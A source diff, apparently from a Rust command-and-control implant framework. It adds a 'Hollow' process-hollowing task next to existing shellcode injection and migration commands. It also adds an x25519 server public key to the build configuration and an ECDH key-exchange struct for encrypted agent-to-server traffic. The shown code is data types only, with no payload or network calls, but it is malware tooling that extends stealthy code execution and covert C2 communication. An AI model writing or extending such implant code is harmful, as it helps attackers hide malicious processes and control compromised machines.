@@ -78,6 +78,7 @@ pub enum TaskCommand {
     Exit,
     Inject   { pid: u32, shellcode: Vec<u8> },
     Migrate  { pid: u32 },
+    Hollow   { target_path: String },
     Cd       { path: String },
     Cat      { path: String },
     Rm       { path: String },
@@ -188,6 +189,9 @@ pub struct BuildConfig {
     /// Hex-encoded 32-byte AES-GCM key. Empty string = plaintext comms.
     #[serde(default)]
     pub c2_key:        String,
+    /// Hex-encoded 32-byte x25519 server static public key. Empty = no ECDH.
+    #[serde(default)]
+    pub server_pubkey: String,
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
@@ -195,6 +199,14 @@ pub enum PayloadFormat {
     Exe,
     Shellcode,
     Dll,
+}
+
+/// ECDH key exchange – agent sends its ephemeral pubkey to server.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct KeyExchangeReq {
+    pub agent_id:    Uuid,
+    /// Agent's x25519 ephemeral public key (32 bytes).
+    pub agent_pubkey: Vec<u8>,
 }
 
 /// Encrypted envelope wrapping agent↔server HTTP requests.
